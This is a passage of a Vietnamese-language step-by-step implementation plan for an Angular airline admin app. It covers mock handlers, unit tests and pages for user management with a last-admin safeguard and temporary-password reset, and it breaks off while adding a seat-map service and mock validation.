    id: 11, email: 'khach02@demo.local', full_name: 'Nguyễn Thị Mai', phone: '0905556677',
    avatar_url: null, is_active: true, is_deleted: false, roles: ['CUSTOMER'],
    created_at: '2026-05-20T02:00:00Z', updated_at: '2026-09-10T03:00:00Z',
  },
  {
    id: 12, email: 'cu@demo.local', full_name: 'Tài khoản đã xóa', phone: null,
    avatar_url: null, is_active: false, is_deleted: true, roles: ['CUSTOMER'],
    created_at: '2026-01-01T02:00:00Z', updated_at: '2026-06-01T03:00:00Z',
  },
];
```

Thêm import `AdminUser` vào đầu `auth.mock.ts`.

- [ ] **Step 4: Đăng ký mock handler**

Trong `mock-registry.ts`, thêm một field và nhánh xử lý. Vì `users` cần ràng buộc riêng (chặn tự hạ quyền, reset mật khẩu) nên **không** dùng `MockResource` — viết handler riêng như `airlines`.

Thêm field:

```ts
  private users: AdminUser[] = USERS_MOCK.map((u) => ({ ...u }));
  private temporaryPasswordSeq = 1;
```

Thêm nhánh trong `resolve()` (trước vòng lặp `resources`):

```ts
    if (path === '/api/v1/users' && m === 'GET') {
      return this.listUsers(url);
    }
    if (path === '/api/v1/users' && m === 'POST') {
      return this.createUser(body);
    }
    const userMatch = path.match(/^\/api\/v1\/users\/(\d+)$/);
    if (userMatch) {
      const id = Number(userMatch[1]);
      if (m === 'GET') return this.getUser(id);
      if (m === 'PUT') return this.updateUser(id, body);
      if (m === 'DELETE') return this.deleteUser(id);
    }
    const resetMatch = path.match(/^\/api\/v1\/users\/(\d+)\/reset-password$/);
    if (resetMatch && m === 'POST') {
      return this.resetPassword(Number(resetMatch[1]));
    }
```

Thêm các method:

```ts
  private aliveUsers(): AdminUser[] {
    return this.users.filter((u) => !u.is_deleted);
  }

  private listUsers(url: string): unknown {
    const params = readParams(url);
    const keyword = (params.get('keyword') ?? '').trim().toLowerCase();
    const isActive = params.get('is_active');
    const role = params.get('role') ?? '';

    let rows = this.aliveUsers();
    if (keyword) {
      rows = rows.filter(
        (u) =>
          u.email.toLowerCase().includes(keyword) ||
          u.full_name.toLowerCase().includes(keyword) ||
          (u.phone ?? '').includes(keyword),
      );
    }
    if (isActive !== null) {
      rows = rows.filter((u) => u.is_active === (isActive === 'true'));
    }
    if (role) {
      rows = rows.filter((u) => u.roles.includes(role as AdminUser['roles'][number]));
    }

    const page = Number(params.get('page') ?? 1);
    const size = Number(params.get('size') ?? 20);
    return ok(paginate(rows, page, size));
  }

  private getUser(id: number): unknown {
    const found = this.aliveUsers().find((u) => u.id === id);
    return found ? ok(found) : notFound('Không tìm thấy người dùng');
  }

  private createUser(body: unknown): unknown {
    const p = (body ?? {}) as Partial<AdminUserCreatePayload>;
    const email = (p.email ?? '').trim().toLowerCase();
    if (!email) return businessError('Email không được để trống');
    if (this.aliveUsers().some((u) => u.email === email)) {
      return duplicate(`Email "${email}" đã tồn tại`);
    }
    const now = new Date().toISOString();
    const created: AdminUser = {
      id: this.nextId++,
      email,
      full_name: p.full_name ?? '',
      phone: p.phone ?? null,
      avatar_url: null,
      is_active: p.is_active ?? true,
      is_deleted: false,
      roles: (p.roles?.length ? p.roles : ['CUSTOMER']),
      created_at: now,
      updated_at: now,
    };
    this.users.push(created);
    return ok(created, 'Tạo người dùng thành công');
  }

  private updateUser(id: number, body: unknown): unknown {
    const target = this.aliveUsers().find((u) => u.id === id);
    if (!target) return notFound('Không tìm thấy người dùng');

    const p = (body ?? {}) as Partial<AdminUserUpdatePayload>;
    const nextRoles = p.roles?.length ? p.roles : target.roles;
    const nextActive = p.is_active ?? target.is_active;

    // BR chống leo thang đặc quyền (API v0.2 mục 2.3): không được để hệ thống
    // mất ADMIN ACTIVE cuối cùng — kể cả khi ADMIN tự hạ quyền chính mình.
    const stillAdmin = nextRoles.includes('ADMIN');
    if (target.roles.includes('ADMIN') && (!stillAdmin || !nextActive)) {
      const otherActiveAdmins = this.aliveUsers().filter(
        (u) => u.id !== id && u.is_active && u.roles.includes('ADMIN'),
      );
      if (otherActiveAdmins.length === 0) {
        return businessError(
          'Không thể hạ quyền hoặc ngừng hoạt động tài khoản ADMIN đang hoạt động cuối cùng',
        );
      }
    }

    Object.assign(target, {
      full_name: p.full_name ?? target.full_name,
      phone: p.phone ?? target.phone,
      is_active: nextActive,
      roles: nextRoles,
      updated_at: new Date().toISOString(),
    });
    return ok(target, 'Cập nhật thành công');
  }

  /** Xóa mềm (USR-05): đặt is_deleted, KHÔNG xóa khỏi mảng. */
  private deleteUser(id: number): unknown {
    const target = this.aliveUsers().find((u) => u.id === id);
    if (!target) return notFound('Không tìm thấy người dùng');

    if (target.roles.includes('ADMIN')) {
      const otherActiveAdmins = this.aliveUsers().filter(
        (u) => u.id !== id && u.is_active && u.roles.includes('ADMIN'),
      );
      if (otherActiveAdmins.length === 0) {
        return businessError('Không thể xóa tài khoản ADMIN đang hoạt động cuối cùng');
      }
    }

    target.is_deleted = true;
    target.is_active = false;
    return ok(null, 'Đã xóa người dùng');
  }

  /**
   * Đặt lại mật khẩu — trả mật khẩu TẠM để ADMIN đưa cho nhân viên.
   * Vì sao trả mật khẩu thay vì nhận: ADMIN không nên biết mật khẩu khách chọn.
   */
  private resetPassword(id: number): unknown {
    const target = this.aliveUsers().find((u) => u.id === id);
    if (!target) return notFound('Không tìm thấy người dùng');
    const temp = `Temp@${String(this.temporaryPasswordSeq++).padStart(5, '0')}`;
    return ok({ temporary_password: temp }, 'Đã đặt lại mật khẩu');
  }
```

Thêm import `USERS_MOCK` từ `@core/mock/data/auth.mock` và `AdminUser, AdminUserCreatePayload, AdminUserUpdatePayload` từ `@core/models/auth.model`.

- [ ] **Step 5: Viết test cho ràng buộc ADMIN cuối cùng**

Thêm vào `mock-registry.spec.ts`:

```ts
describe('User mock — chặn mất ADMIN cuối cùng', () => {
  it('từ chối hạ quyền ADMIN ACTIVE cuối cùng xuống CUSTOMER', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('PUT', 'http://x/api/v1/users/1', {
      full_name: 'Quản trị viên',
      phone: '0901234567',
      is_active: true,
      roles: ['CUSTOMER'],
    }) as ApiResponse<null>;

    expect(res.code).toBe(1006);
  });

  it('từ chối ngừng hoạt động ADMIN ACTIVE cuối cùng', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('PUT', 'http://x/api/v1/users/1', {
      full_name: 'Quản trị viên',
      phone: '0901234567',
      is_active: false,
      roles: ['ADMIN'],
    }) as ApiResponse<null>;

    expect(res.code).toBe(1006);
  });

  it('CHO PHÉP hạ quyền khi còn ADMIN ACTIVE khác', () => {
    const registry = new MockRegistry();
    // Tạo thêm một ADMIN đang hoạt động.
    registry.resolve('POST', 'http://x/api/v1/users', {
      email: 'admin2@demo.local',
      password: 'Temp@12345',
      full_name: 'Quản trị viên 2',
      phone: null,
      is_active: true,
      roles: ['ADMIN'],
    });

    const res = registry.resolve('PUT', 'http://x/api/v1/users/1', {
      full_name: 'Quản trị viên',
      phone: '0901234567',
      is_active: true,
      roles: ['CUSTOMER'],
    }) as ApiResponse<AdminUser>;

    expect(res.code).toBe(1000);
    expect(res.data.roles).toEqual(['CUSTOMER']);
  });

  it('reset-password trả mật khẩu tạm', () => {
    const registry = new MockRegistry();
    const res = registry.resolve(
      'POST',
      'http://x/api/v1/users/2/reset-password',
    ) as ApiResponse<{ temporary_password: string }>;

    expect(res.code).toBe(1000);
    expect(res.data.temporary_password).toMatch(/^Temp@\d{5}$/);
  });

  it('danh sách KHÔNG lộ bản ghi đã xóa mềm', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('GET', 'http://x/api/v1/users') as ApiResponse<
      PageData<AdminUser>
    >;

    expect(res.data.items.some((u) => u.email === 'cu@demo.local')).toBe(false);
  });
});
```

Thêm import `PageData` từ `@core/models/api-response.model`, `AdminUser` từ `@core/models/auth.model`.

- [ ] **Step 6: Chạy test — FAIL rồi PASS**

Run: `npx ng test --watch=false`
Expected: lần đầu FAIL (chưa có handler), sau khi thêm handler PASS toàn bộ.

- [ ] **Step 7: Commit**

```bash
git add src/app/core/models/auth.model.ts src/app/core/services/catalog.service.ts \
  src/app/core/mock/data/auth.mock.ts src/app/core/mock/mock-registry.ts \
  src/app/core/mock/mock-registry.spec.ts
git commit -m "feat(user): model, service và mock cho quản lý người dùng"
```

### Task 2.2: Màn danh sách + chi tiết người dùng

**Files:**
- Create: `src/app/features/admin/pages/users/users.ts`
- Create: `src/app/features/admin/pages/users/user-form.ts`
- Create: `src/app/features/admin/pages/users/user-form.html`
- Create: `src/app/features/admin/pages/users/user-form.css`
- Modify: `src/app/app.routes.ts`
- Test: `src/app/features/admin/pages/users/users.spec.ts`

**Interfaces:**
- Consumes: `UserService`, `RoleService`, `AdminUser`, `AdminUserCreatePayload`, `AdminUserUpdatePayload` từ Task 2.1 và Cụm 1.
- Produces: `AdminUsers`, `UserForm`; route `/admin/users` (4 route con qua `crudRoutes`).

- [ ] **Step 1: Viết màn danh sách**

Tạo `src/app/features/admin/pages/users/users.ts`:

```ts
import { ChangeDetectionStrategy, Component, inject } from '@angular/core';
import { AdminUser, AdminUserUpdatePayload } from '@core/models/auth.model';
import { UserService } from '@core/services/catalog.service';
import { CrudConfig } from '@shared/crud/crud-config';
import { CrudPage } from '@shared/crud/crud-page';

/** USR-01→05 — API v0.2 mục 2.3. */
@Component({
  selector: 'app-admin-users',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [CrudPage],
  template: `<app-crud-page [config]="config" [service]="service" />`,
})
export class AdminUsers {
  protected readonly service = inject(UserService);

  protected readonly config: CrudConfig<AdminUser, AdminUserUpdatePayload> = {
    title: 'Người dùng',
    subtitle: 'Quản lý tài khoản, vai trò và trạng thái hoạt động',
    createLabel: 'Thêm người dùng',
    searchPlaceholder: 'Tìm theo email, họ tên hoặc số điện thoại',
    emptyIcon: 'manage_accounts',
    emptyMessage: 'Chưa có người dùng',
    emptyHint: 'Thêm tài khoản đầu tiên',
    editTitle: 'Sửa người dùng',
    // Form riêng: có nút "Đặt lại mật khẩu" và ràng buộc ADMIN cuối cùng.
    deleteTitle: () => 'Ngừng sử dụng tài khoản?',
    deleteMessage: (r) =>
      `Bạn có chắc muốn xóa "${r.full_name}"? Tài khoản được giữ lại để tra lịch sử nhưng không đăng nhập được nữa.`,
    columns: [
      { label: 'Họ tên', value: (r) => r.full_name },
      { label: 'Email', value: (r) => r.email, kind: 'code' },
      {
        label: 'Vai trò',
        value: (r) => (r.roles[0] === 'ADMIN' ? 'Quản trị' : r.roles[0] === 'STAFF' ? 'Nhân viên' : 'Khách hàng'),
        tone: (r) => (r.roles[0] === 'ADMIN' ? 'danger' : r.roles[0] === 'STAFF' ? 'info' : 'neutral'),
        width: '130px',
      },
      {
        label: 'Trạng thái',
        value: (r) => (r.is_active ? 'Hoạt động' : 'Ngừng'),
        tone: (r) => (r.is_active ? 'success' : 'neutral'),
        width: '120px',
      },
      {
        label: 'Ngày tạo',
        value: (r) => new Date(r.created_at).toLocaleDateString('vi-VN'),
        width: '110px',
      },
    ],
    fields: [],
    filters: [
      {
        key: 'is_active',
        label: 'Lọc theo trạng thái',
        defaultValue: '',
        options: [
          { value: '', label: 'Tất cả trạng thái' },
          { value: 'true', label: 'Hoạt động' },
          { value: 'false', label: 'Ngừng' },
        ],
      },
      {
        key: 'role',
        label: 'Lọc theo vai trò',
        defaultValue: '',
        options: [
          { value: '', label: 'Tất cả vai trò' },
          { value: 'ADMIN', label: 'Quản trị' },
          { value: 'STAFF', label: 'Nhân viên' },
          { value: 'CUSTOMER', label: 'Khách hàng' },
        ],
      },
    ],
  };
}
```

- [ ] **Step 2: Viết form riêng — phần TS**

Tạo `src/app/features/admin/pages/users/user-form.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { MatSnackBar } from '@angular/material/snack-bar';
import { AdminUserCreatePayload, AdminUserUpdatePayload, RoleName } from '@core/models/auth.model';
import { UserService } from '@core/services/catalog.service';
import { AuthService } from '@core/services/auth.service';
import { AppButton } from '@shared/ui/app-button/app-button';
import { AppCard } from '@shared/ui/app-card/app-card';
import { LoadingState } from '@shared/ui/loading-state/loading-state';

/**
 * Form người dùng — trang riêng, KHÔNG dùng `CrudPage`.
 *
 * Vì sao phải tách: hai hành động không biểu diễn được bằng danh sách trường
 * phẳng — (1) "Đặt lại mật khẩu" trả mật khẩu TẠM từ server rồi hiện ra cho
 * ADMIN chép, không phải một ô nhập; (2) chặn tự hạ quyền khi đây là ADMIN
 * ACTIVE cuối cùng, một ràng buộc phụ thuộc cả danh sách user chứ không chỉ
 * bản ghi đang sửa.
 */
@Component({
  selector: 'app-user-form',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [FormsModule, RouterLink, MatIconModule, AppButton, AppCard, LoadingState],
  templateUrl: './user-form.html',
  styleUrl: './user-form.css',
})
export class UserForm {
  private readonly service = inject(UserService);
  private readonly authService = inject(AuthService);
  private readonly activatedRoute = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly snackBar = inject(MatSnackBar);

  protected readonly loading = signal(false);
  protected readonly saving = signal(false);
  protected readonly isEdit = signal(false);
  protected readonly userId = signal<number | null>(null);

  /** Mật khẩu tạm vừa sinh — chỉ hiện sau khi ADMIN bấm Đặt lại. */
  protected readonly tempPassword = signal<string | null>(null);

  protected readonly draft = signal({
    email: '',
    password: '',
    full_name: '',
    phone: '',
    is_active: true,
    role: 'CUSTOMER' as RoleName,
  });

  protected readonly errors = signal<Record<string, string>>({});

  /** Chỉ ADMIN đang đăng nhập mới thấy cảnh báo "đây là chính bạn". */
  protected readonly isSelf = computed(() => this.userId() === this.authService.currentUser()?.id);

  constructor() {
    const id = this.activatedRoute.snapshot.paramMap.get('id');
    if (id) {
      this.isEdit.set(true);
      this.userId.set(Number(id));
      this.loadOne(Number(id));
    }
  }

  private loadOne(id: number): void {
    this.loading.set(true);
    this.service.getById(id).subscribe({
      next: (res) => {
        const u = res.data;
        this.draft.set({
          email: u.email,
          password: '',
          full_name: u.full_name,
          phone: u.phone ?? '',
          is_active: u.is_active,
          role: u.roles[0] ?? 'CUSTOMER',
        });
        this.loading.set(false);
      },
      error: (err: Error) => {
        this.notify(err.message);
        this.loading.set(false);
        this.router.navigate(['/admin/users']);
      },
    });
  }

  protected setDraft<K extends keyof ReturnType<typeof this.draft>>(
    key: K,
    value: ReturnType<typeof this.draft>[K],
  ): void {
    this.draft.set({ ...this.draft(), [key]: value });
    if (this.errors()[key as string]) {
      const next = { ...this.errors() };
      delete next[key as string];
      this.errors.set(next);
    }
  }

  protected fieldError(key: string): string {
    return this.errors()[key] ?? '';
  }

  private validate(): boolean {
    const d = this.draft();
    const errors: Record<string, string> = {};

    if (!this.isEdit()) {
      if (!d.email.trim()) {
        errors['email'] = 'Email không được để trống';
      } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(d.email.trim())) {
        errors['email'] = 'Email không hợp lệ';
      }
      if (!d.password) {
        errors['password'] = 'Mật khẩu không được để trống';
      } else if (d.password.length < 8) {
        errors['password'] = 'Mật khẩu phải có ít nhất 8 ký tự';
      }
    }

    if (!d.full_name.trim()) {
      errors['full_name'] = 'Họ tên không được để trống';
    }
    if (d.phone && !/^0\d{9}$/.test(d.phone.trim())) {
      errors['phone'] = 'Số điện thoại phải gồm 10 số, bắt đầu bằng 0';
    }

    this.errors.set(errors);
    return Object.keys(errors).length === 0;
  }

  protected save(): void {
    if (!this.validate()) {
      this.notify('Vui lòng kiểm tra lại các ô được đánh dấu');
      return;
    }

    const d = this.draft();
    const id = this.userId();
    this.saving.set(true);

    const request$ = id
      ? this.service.update(id, {
          full_name: d.full_name.trim(),
          phone: d.phone.trim() || null,
          is_active: d.is_active,
          roles: [d.role],
        } satisfies AdminUserUpdatePayload)
      : this.service.create({
          email: d.email.trim().toLowerCase(),
          password: d.password,
          full_name: d.full_name.trim(),
          phone: d.phone.trim() || null,
          is_active: d.is_active,
          roles: [d.role],
        } satisfies AdminUserCreatePayload);

    request$.subscribe({
      next: (res) => {
        this.saving.set(false);
        this.notify(res.message);
        this.router.navigate(['/admin/users']);
      },
      error: (err: Error) => {
        this.saving.set(false);
        // Lỗi 1006 khi hạ quyền ADMIN cuối cùng rơi vào đây.
        this.notify(err.message);
      },
    });
  }

  /**
   * Đặt lại mật khẩu — server sinh mật khẩu tạm và trả về; FE chỉ hiện ra cho
   * ADMIN chép rồi đưa cho nhân viên. Không cho ADMIN tự nhập mật khẩu mới vì
   * như vậy ADMIN sẽ biết mật khẩu của người khác.
   */
  protected resetPassword(): void {
    const id = this.userId();
    if (!id) return;

    this.service.resetPassword(id).subscribe({
      next: (res) => {
        this.tempPassword.set(res.data.temporary_password);
        this.notify(res.message);
      },
      error: (err: Error) => this.notify(err.message),
    });
  }

  protected cancel(): void {
    this.router.navigate(['/admin/users']);
  }

  private notify(message: string): void {
    this.snackBar.open(message, 'Đóng', { duration: 3000 });
  }
}
```

**Về dropdown vai trò:** dùng 3 lựa chọn cứng `CUSTOMER`/`STAFF`/`ADMIN` thay vì gọi `GET /roles`. Vì sao: DB v0.4 chốt role cố định (BR-RBAC-03) nên danh sách này không đổi, và gọi thêm một request chỉ để lấy đúng 3 chuỗi là thừa. Nếu sau này role thành dữ liệu động thì đổi sang `RoleService.list()`.

- [ ] **Step 3: Viết form — HTML**

Tạo `src/app/features/admin/pages/users/user-form.html`. Cấu trúc bám `promotion-form.html` (cùng khuôn `.wrap--narrow`, `.crumbs`, `.page-h`, `.form-grid`, `.field`, `.blk`, `.form-actions`):

```html
<div class="wrap wrap--narrow">
  <nav class="crumbs" aria-label="Đường dẫn">
    <a routerLink="/admin/users">Người dùng</a>
    <mat-icon>chevron_right</mat-icon>
    <span>{{ isEdit() ? 'Sửa' : 'Thêm mới' }}</span>
  </nav>

  <header class="page-h">
    <div>
      <h1>{{ isEdit() ? 'Sửa người dùng' : 'Thêm người dùng' }}</h1>
      <p>Khai báo thông tin tài khoản, vai trò và trạng thái hoạt động.</p>
    </div>
  </header>

  @if (loading()) {
    <app-app-card><app-loading-state /></app-app-card>
  } @else {
    @if (isSelf()) {
      <app-app-card class="blk">
        <p class="note">
          Đây là tài khoản bạn đang đăng nhập. Nếu là ADMIN đang hoạt động cuối cùng, hệ thống
          sẽ từ chối hạ quyền hoặc ngừng hoạt động.
        </p>
      </app-app-card>
    }

    <app-app-card title="Thông tin tài khoản" class="blk">
      <div class="form-grid">
        <div class="field" [class.field--error]="fieldError('email')">
          <label for="u-email">Email <span class="req">*</span></label>
          <input
            id="u-email"
            type="email"
            maxlength="255"
            name="email"
            [disabled]="isEdit()"
            [ngModel]="draft().email"
            (ngModelChange)="setDraft('email', $event)"
            placeholder="Ví dụ staff01@example.com"
          />
          @if (fieldError('email'); as msg) {
            <span class="field__err">{{ msg }}</span>
          } @else if (isEdit()) {
            <span class="hint">Email không đổi được sau khi tạo</span>
          }
        </div>

        @if (!isEdit()) {
          <div class="field" [class.field--error]="fieldError('password')">
            <label for="u-pass">Mật khẩu ban đầu <span class="req">*</span></label>
            <input
              id="u-pass"
              type="password"
              maxlength="100"
              name="password"
              [ngModel]="draft().password"
              (ngModelChange)="setDraft('password', $event)"
              placeholder="Ít nhất 8 ký tự"
            />
            @if (fieldError('password'); as msg) {
              <span class="field__err">{{ msg }}</span>
            } @else {
              <span class="hint">Nhân viên nên đổi mật khẩu sau lần đăng nhập đầu</span>
            }
          </div>
        }

        <div class="field" [class.field--error]="fieldError('full_name')">
          <label for="u-name">Họ tên <span class="req">*</span></label>
          <input
            id="u-name"
            type="text"
            maxlength="150"
            name="full_name"
            [ngModel]="draft().full_name"
            (ngModelChange)="setDraft('full_name', $event)"
          />
          @if (fieldError('full_name'); as msg) {
            <span class="field__err">{{ msg }}</span>
          }
        </div>

        <div class="field" [class.field--error]="fieldError('phone')">
          <label for="u-phone">Số điện thoại</label>
          <input
            id="u-phone"
            type="tel"
            maxlength="20"
            name="phone"
            [ngModel]="draft().phone"
            (ngModelChange)="setDraft('phone', $event)"
            placeholder="Ví dụ 0912345678"
          />
          @if (fieldError('phone'); as msg) {
            <span class="field__err">{{ msg }}</span>
          }
        </div>

        <div class="field">
          <label for="u-role">Vai trò <span class="req">*</span></label>
          <select
            id="u-role"
            name="role"
            [ngModel]="draft().role"
            (ngModelChange)="setDraft('role', $event)"
          >
            <option value="CUSTOMER">Khách hàng</option>
            <option value="STAFF">Nhân viên vận hành</option>
            <option value="ADMIN">Quản trị viên</option>
          </select>
          <span class="hint">Mỗi tài khoản giữ một vai trò (BR-RBAC-02)</span>
        </div>

        <div class="field field--full">
          <label class="toggle">
            <input
              type="checkbox"
              name="is_active"
              [ngModel]="draft().is_active"
              (ngModelChange)="setDraft('is_active', $event)"
            />
            <span>Đang hoạt động</span>
          </label>
        </div>
      </div>
    </app-app-card>

    @if (isEdit()) {
      <app-app-card title="Đặt lại mật khẩu" class="blk">
        <p class="note">
          Hệ thống sinh một mật khẩu tạm và hiện ra một lần. Hãy chép lại rồi gửi cho nhân viên —
          họ nên đổi ngay sau khi đăng nhập.
        </p>

        @if (tempPassword(); as temp) {
          <div class="temp-pass">
            <code>{{ temp }}</code>
            <span class="hint">Mật khẩu tạm — chỉ hiện trong phiên làm việc này</span>
          </div>
        } @else {
          <app-app-button variant="ghost" (clicked)="resetPassword()">
            <mat-icon>lock_reset</mat-icon>
            Đặt lại mật khẩu
          </app-app-button>
        }
      </app-app-card>
    }

    <div class="form-actions">
      <app-app-button variant="ghost" (clicked)="cancel()">Hủy</app-app-button>
      <app-app-button [disabled]="saving()" (clicked)="save()">
        {{ saving() ? 'Đang lưu…' : 'Lưu người dùng' }}
      </app-app-button>
    </div>
  }
</div>
```

- [ ] **Step 4: Viết form — CSS**

Tạo `src/app/features/admin/pages/users/user-form.css`. **Sao chép nguyên `promotion-form.css`** rồi thêm khối `.temp-pass` ở cuối (trước media query):

```css
/* Khối hiện mật khẩu tạm — nổi bật để ADMIN không bỏ sót. */
.temp-pass {
  display: flex;
  flex-direction: column;
  gap: 6px;
  padding: 14px 16px;
  border: 1.5px dashed var(--color-warning);
  border-radius: var(--radius);
  background: var(--color-warning-soft);
}

.temp-pass code {
  font-family: var(--font-mono, monospace);
  font-size: 19px;
  font-weight: 700;
  letter-spacing: 1px;
  color: var(--color-on-warning-soft);
  user-select: all;
}
```

- [ ] **Step 5: Viết test**

Tạo `src/app/features/admin/pages/users/users.spec.ts`:

```ts
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { TestBed } from '@angular/core/testing';
import { provideRouter } from '@angular/router';
import { MockRegistry } from '@core/mock/mock-registry';
import { mockInterceptor } from '@core/mock/mock.interceptor';
import { AdminUsers } from '@features/admin/pages/users/users';

describe('AdminUsers (tích hợp mock)', () => {
  beforeEach(async () => {
    await TestBed.configureTestingModule({
      imports: [AdminUsers],
      providers: [
        provideRouter([]),
        MockRegistry,
        provideHttpClient(withInterceptors([mockInterceptor])),
      ],
    }).compileComponents();
  });

  it('render danh sách người dùng đang hoạt động', async () => {
    const fixture = TestBed.createComponent(AdminUsers);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 600));
    fixture.detectChanges();

    const text = (fixture.nativeElement as HTMLElement).textContent ?? '';
    expect(text).toContain('admin@demo.local');
    expect(text).toContain('staff@demo.local');
  });

  it('KHÔNG hiện tài khoản đã xóa mềm', async () => {
    const fixture = TestBed.createComponent(AdminUsers);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 600));
    fixture.detectChanges();

    const text = (fixture.nativeElement as HTMLElement).textContent ?? '';
    expect(text).not.toContain('cu@demo.local');
  });
});
```

- [ ] **Step 6: Chạy test — PASS**

Run: `npx ng test --watch=false`
Expected: PASS.

- [ ] **Step 7: Thêm route**

Trong `src/app/app.routes.ts`, **xóa** `...comingSoonAdmin('users', 'Người dùng', true),` và thêm:

```ts
      ...crudRoutes('users', 'Người dùng', () =>
        import('@features/admin/pages/users/users').then((m) => m.AdminUsers),
        {
          adminOnly: true,
          formLoader: () => import('@features/admin/pages/users/user-form').then((m) => m.UserForm),
        },
      ),
```

- [ ] **Step 8: Build + kiểm chứng trên trình duyệt**

Run: `npx ng build`
Expected: build xanh.

Trên trình duyệt (`admin@demo.local`):
- `/admin/users`: 5 dòng (không có `cu@demo.local`), cột Vai trò có nhãn màu.
- `/admin/users/1/edit`: hiện cảnh báo "Đây là tài khoản bạn đang đăng nhập", bấm **Đặt lại mật khẩu** ra chuỗi `Temp@00001`.
- Ở `/admin/users/1/edit`, đổi vai trò sang **Khách hàng** rồi Lưu → phải hiện thông báo lỗi *"Không thể hạ quyền hoặc ngừng hoạt động tài khoản ADMIN đang hoạt động cuối cùng"*.
- 375px: không tràn ngang.

- [ ] **Step 9: Commit**

```bash
git add src/app/features/admin/pages/users/ src/app/app.routes.ts
git commit -m "feat(user): màn quản lý người dùng và form riêng có đặt lại mật khẩu"
```

---

# CỤM 3 — Sơ đồ ghế

Màn phức tạp nhất. Nghiệp vụ: ADMIN khai báo theo **khối** (hàng từ–đến × danh sách cột × loại ghế) → hệ thống sinh lưới xem trước → ADMIN sửa lẻ từng ô → bấm Lưu gửi **cả sơ đồ** trong một transaction. Tổng số ghế phải khớp **chính xác** `aircrafts.seat_capacity`.

### Task 3.1: Model SeatMap + service + mock

**Files:**
- Modify: `src/app/core/services/catalog.service.ts`
- Modify: `src/app/core/mock/mock-registry.ts`
- Test: `src/app/core/mock/mock-registry.spec.ts`

**Interfaces:**
- Consumes: `SeatMap`, `AircraftSeat`, `SeatType` (đã có ở `@core/models/fleet-news.model`), `AircraftService` (đã có).
- Produces: `SeatMapService` với `getMap(aircraftId)`, `saveMap(aircraftId, seats)`.

- [ ] **Step 1: Thêm service**

Thêm vào `src/app/core/services/catalog.service.ts`:

```ts
/**
 * Sơ đồ ghế của máy bay — API v0.2 mục 2.6.
 *
 * Vì sao không dùng `BaseCrudService`: sơ đồ ghế không CRUD từng ghế mà đọc/lưu
 * CẢ sơ đồ một lần (`PUT` thay thế toàn bộ trong một transaction). Không có
 * endpoint tạo/sửa/xóa từng ghế.
 */
@Injectable({ providedIn: 'root' })
export class SeatMapService {
  private readonly http = inject(HttpClient);
  private readonly baseUrl = `${environment.apiBaseUrl}/aircrafts`;

  getMap(aircraftId: number): Observable<ApiResponse<SeatMap>> {
    return this.http.get<ApiResponse<SeatMap>>(`${this.baseUrl}/${aircraftId}/seat-map`);
  }

  /** Gửi TOÀN BỘ danh sách ghế; Backend thay thế sơ đồ cũ trong một transaction. */
  saveMap(aircraftId: number, seats: AircraftSeat[]): Observable<ApiResponse<SeatMap>> {
    return this.http.put<ApiResponse<SeatMap>>(`${this.baseUrl}/${aircraftId}/seat-map`, { seats });
  }
}
```

Thêm `AircraftSeat, SeatMap` vào import từ `@core/models/fleet-news.model`.

- [ ] **Step 2: Đăng ký mock handler**

Trong `mock-registry.ts`, thêm field lưu sơ đồ theo máy bay:

```ts
  /**
   * Sơ đồ ghế theo `aircraft_id`. Khởi tạo rỗng — máy bay chưa cấu hình ghế
   * nào, đúng trạng thái ban đầu của hệ thống thật.
   */
  private seatMaps = new Map<number, AircraftSeat[]>();
  private seatIdSeq = 1000;
```

Thêm nhánh trong `resolve()`:

```ts
    const seatMapMatch = path.match(/^\/api\/v1\/aircrafts\/(\d+)\/seat-map$/);
    if (seatMapMatch) {
      const aircraftId = Number(seatMapMatch[1]);
      if (m === 'GET') return this.getSeatMap(aircraftId);
      if (m === 'PUT') return this.saveSeatMap(aircraftId, body);
    }
```

Thêm method:

```ts
  /** Máy bay theo id, chỉ tính bản ghi chưa xóa mềm. */
  private aircraftById(id: number): Aircraft | undefined {
    return AIRCRAFT_MOCK.find((a) => a.id === id && !a.is_deleted);
  }

  private getSeatMap(aircraftId: number): unknown {
    const aircraft = this.aircraftById(aircraftId);
    if (!aircraft) return notFound('Không tìm thấy máy bay');

    const seats = this.seatMaps.get(aircraftId) ?? [];
    return ok({
      aircraft_id: aircraftId,
      seat_capacity: aircraft.seat_capacity,
      configured_seats: seats.length,
      // API trả kèm loại ghế lồng trong từng ghế.
      seats: seats.map((s) => ({
        ...s,
        seat_type: SEAT_TYPES_MOCK.find((t) => t.id === s.seat_type_id) ?? null,
      })),
    });
  }

  private saveSeatMap(aircraftId: number, body: unknown): unknown {
    const aircraft = this.aircraftById(aircraftId);
    if (!aircraft) return notFound('Không tìm thấy máy bay');

    const seats = ((body ?? {}) as { seats?: AircraftSeat[] }).seats ?? [];

    // Ràng buộc 1: không trùng (seat_row, seat_column) — UNIQUE trong DB v0.4.
    const seen = new Set<string>();
    for (const s of seats) {
      const key = `${s.seat_row}-${s.seat_column}`;
      if (seen.has(key)) {
        return businessError(`Ghế ${s.seat_row}${s.seat_column} bị lặp trong sơ đồ`);
      }
      seen.add(key);
    }

    // Ràng buộc 2: loại ghế phải tồn tại và đang bật.
    for (const s of seats) {
      const type = SEAT_TYPES_MOCK.find((t) => t.id === s.seat_type_id);
      if (!type) return notFound(`Loại ghế id ${s.seat_type_id} không tồn tại`);
      if (!type.is_active) {
        return businessError(`Loại ghế "${type.seat_type_name}" đang tắt, không dùng được`);
      }
    }

    // Ràng buộc 3: tổng số ghế phải KHỚP CHÍNH XÁC sức chứa (v0.4 yêu cầu khớp,
    // không phải "không vượt").
    if (seats.length !== aircraft.seat_capacity) {
      return businessError(
        `Sơ đồ có ${seats.length} ghế nhưng máy bay cần đúng ${aircraft.seat_capacity} ghế`,
      );
    }

    this.seatMaps.set(
      aircraftId,
      seats.map((s) => ({ ...s, id: s.id ?? this.seatIdSeq++ })),
    );
